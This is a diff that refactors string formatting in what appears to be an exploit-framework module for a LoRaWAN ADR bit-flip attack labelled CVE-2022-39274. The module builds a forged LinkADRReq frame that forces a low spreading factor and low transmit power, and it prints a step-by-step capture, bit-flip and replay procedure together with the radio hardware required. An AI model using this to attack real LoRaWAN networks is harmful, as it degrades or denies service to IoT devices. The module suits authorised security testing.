@@ -101,22 +101,21 @@ class Exploit(Exploit):
         print_status("LoRaWAN ADR bit-flip attack (CVE-2022-39274)")
         dev_addr = self._parse_dev_addr()
         if dev_addr is None:
-            print_error("Endereço de dispositivo inválido: {}".format(self.dev_addr))
+            print_error(f"Endereço de dispositivo inválido: {self.dev_addr}")
             return
 
-        print_info("DevAddr alvo: 0x{:08X}".format(dev_addr))
-        print_info("Frequência: {} Hz | SF captura: {} | SF alvo: {}".format(
-            self.frequency, self.spreading_factor, self.target_sf))
+        print_info(f"DevAddr alvo: 0x{dev_addr:08X}")
+        print_info(f"Frequência: {self.frequency} Hz | SF captura: {self.spreading_factor} | SF alvo: {self.target_sf}")
 
         if self.interface:
-            print_status("Interface SDR configurada: {}".format(self.interface))
+            print_status(f"Interface SDR configurada: {self.interface}")
         else:
             print_warning("interface não definida — configure seu SDR manualmente")
 
         print_status("Construindo frame uplink de amostra...")
         sample_payload = os.urandom(8)
         uplink = _build_lorawan_uplink(dev_addr, fcnt=42, fport=1, payload=sample_payload)
-        print_info("Frame original: {} bytes | hex: {}".format(len(uplink), uplink.hex()))
+        print_info(f"Frame original: {len(uplink)} bytes | hex: {uplink.hex()}")
 
         print_status("Gerando variantes de manipulação ADR...")
         variants = [
@@ -131,20 +130,18 @@ class Exploit(Exploit):
         dr_txpow = ((int(self.target_sf) & 0x0F) << 4) | (int(self.target_power) & 0x0F)
         adr_cmd = _build_link_adr_req(dr_txpow, 0x00FF, 0x01)
         variants.append(("LinkADRReq injeção", adr_cmd,
-                          "Força SF{}/TXPow={}".format(self.target_sf, self.target_power)))
+                          f"Força SF{self.target_sf}/TXPow={self.target_power}"))
 
         headers = ["Variante", "Tamanho", "Efeito", "Dados (hex, 32B)"]
         rows = [(n, str(len(d)), ef, d[:32].hex()) for n, d, ef in variants]
         print_table(headers, *rows)
 
         print_info("Fluxo de ataque:")
-        print_info("  1. Capturar uplinks legítimos de DevAddr 0x{:08X}".format(dev_addr))
+        print_info(f"  1. Capturar uplinks legítimos de DevAddr 0x{dev_addr:08X}")
         print_info("  2. Flip de bits ADR/FCnt nos frames capturados")
         print_info("  3. Replay dos frames modificados para o servidor de rede")
         print_info("  4. Servidor emite LinkADRReq incorreto para o dispositivo")
-        print_info("  5. Dispositivo adota parâmetros degradados (SF{}, baixa potência)".format(
-            self.target_sf))
+        print_info(f"  5. Dispositivo adota parâmetros degradados (SF{self.target_sf}, baixa potência)")
         print_warning("CVE-2022-39274: manipulação ADR degrada ou nega link LoRaWAN")
-        print_info("Hardware necessário: SDR TX/RX configurado para LoRa SF{} em {} Hz".format(
-            self.spreading_factor, self.frequency))
+        print_info(f"Hardware necessário: SDR TX/RX configurado para LoRa SF{self.spreading_factor} em {self.frequency} Hz")
         print_info("Ferramenta sugerida: gr-lora + GNU Radio ou Chirpotle framework")
